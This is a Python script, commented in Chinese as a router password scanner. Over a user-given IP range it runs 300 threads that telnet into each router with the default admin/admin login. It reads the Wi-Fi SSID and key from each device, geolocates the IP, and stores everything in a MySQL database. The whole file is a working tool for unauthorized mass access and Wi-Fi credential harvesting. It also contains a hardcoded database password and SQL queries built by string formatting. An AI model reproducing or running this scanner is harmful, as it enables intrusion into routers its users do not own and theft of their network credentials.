#encoding=utf-8

#路由器密码扫描工具
#前置需求库：pymysql、requests

import pymysql
import requests
import queue
from threading import Thread
import telnetlib
import time
import re
import subprocess
import json

#from collections import queue

class Database:
    host = 'localhost'
    user = 'root'
    password = 'toor123'
    db = 'ttlwifi'
    charset = 'utf8'

    def __init__(self):
        self.my=pymysql.connect(host=self.host,user=self.user,passwd=self.password,db=self.db,charset=self.charset)
        self.myc=self.my.cursor(pymysql.cursors.DictCursor)


    def insert(self, query):
        #print(query)
        try:
            self.myc.execute(query)
            self.my.commit()
        except:
            self.my.rollback()

    def query(self, query):
        self.myc.execute(query)
        return self.myc.fetchall()

    def __del__(self):
        self.my.close()


#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,
                            (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8,
                            num & 0x000000ff)

#get all ips list between start ip and end ip
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#main function
def bThread(iplist):
    threadl = []
    threads = 300 #------------------------------------------------------
    queue1 = queue.Queue()
    hosts = iplist
    for host in hosts:
        queue1.put(host)

    threadl = [tThread(queue1) for x in list(range(0, threads))]
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#get host position by Taobao API
def getposition(host):
    try:
        ipurl = "http://ip.taobao.com/service/getIpInfo.php?ip="+host
        r = requests.get(ipurl)
        value = json.loads(r.text)['data']
        info = [value['country'],value['region'],value['city'],value['isp'] ]
        return info
    except Exception as e:
        print("Get " + host+" position failed , will retry ...\n")
        getposition(host)
        
        
class tThread(Thread):
    username = "admin"
    password = "admin"
    TIMEOUT = 15

    def __init__(self, queue1):
        Thread.__init__(self)
        self.queue1 = queue1

    def run(self):
        while not self.queue1.empty():
            host = self.queue1.get()
            try:
                #print host
                data = self.telnet(host)
            except Exception as e:
                #print(e)
                continue

    def telnet(self, host):
        t = telnetlib.Telnet(host, timeout=self.TIMEOUT)
        t.read_until(b"username:", self.TIMEOUT)
        t.write(self.username.encode('ascii') + b"\n")
        t.read_until(b"password:", self.TIMEOUT)
        t.write(self.password.encode('ascii') + b"\n")
        t.write(b"wlctl show\n")
        t.read_until(b"SSID", self.TIMEOUT)
        str = t.read_very_eager().decode('ascii')
        t.close()
        str = "".join(str.split())
        SID = str[1:str.find('QSS')]
        KEY = str[str.find('Key=') + 4:str.find('cmd')] if str.find('Key=') != -1 else ''
        if SID != '':
            currentTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            try:
                ipinfo = getposition(host)
                mysql = Database()
                queryStr = "SELECT id FROM keydata where password='%s' and ssid='%s'" % (KEY,SID)
                ifexsit = len(mysql.query(queryStr))
                if ifexsit<1:
                    try:
                        mysql.insert("INSERT INTO keydata(ip, ssid, password, createtime,country,province,city,isp) VALUES('%s', '%s', '%s', '%s','%s','%s','%s','%s')" % (host, SID.replace("'","''"), KEY.replace("'","''"),currentTime,ipinfo[0],ipinfo[1],ipinfo[2],ipinfo[3]))
                        print('['+host+']Insert '+ SID +' into database success !\n')
                    except Exception as e:
                        print('['+host+']Save '+ SID +' failed , will resave ...... \n')
                        bThread([host])
                else:
                    print('['+host+']Found '+ SID +' in database ! \n')
            except Exception as e:
                print(e)
                exit(1)

def run(startIp,endIp):
    iplist = ip_range(startIp, endIp)
    print('\nTotal '+str(len(iplist))+" IP...\n")
    bThread(iplist)


if __name__ == '__main__':
    startIp = input('Start IP：')
    endIp = input('End IP：')
    run(startIp, endIp)
